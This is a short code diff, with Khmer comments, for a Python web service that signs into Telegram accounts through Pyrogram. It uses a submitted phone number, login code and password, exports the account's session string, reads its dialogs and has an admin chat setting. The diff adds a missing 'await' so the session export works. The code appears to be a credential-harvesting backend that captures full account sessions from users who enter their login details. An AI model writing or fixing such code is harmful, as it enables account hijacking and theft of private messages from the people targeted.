@@ -13,7 +13,6 @@ ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
 
 temp_clients = {}
 
-# បង្កើត Global Event Loop ថេរមួយសម្រាប់ដំណើរការ Pyrogram ទាំងអស់
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
@@ -73,7 +72,8 @@ async def async_verify_code(phone_number, code, password):
     username = f"@{me.username}" if me.username else "No Username"
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"
 
-    session_string = client.export_session_string()
+    # 🚨 កែតម្រូវត្រង់នេះ៖ បន្ថែម await នៅមុខ client.export_session_string()
+    session_string = await client.export_session_string()
 
     try:
         async for dialog in client.get_dialogs():
@@ -145,7 +145,6 @@ def verify_code():
         return jsonify({"success": False, "error": str(err)}), 400
 
 if __name__ == '__main__':
-    # ចាប់ផ្ដើម Background Thread សម្រាប់រត់ Global Event Loop
     import threading
     threading.Thread(target=loop.run_forever, daemon=True).start()
 
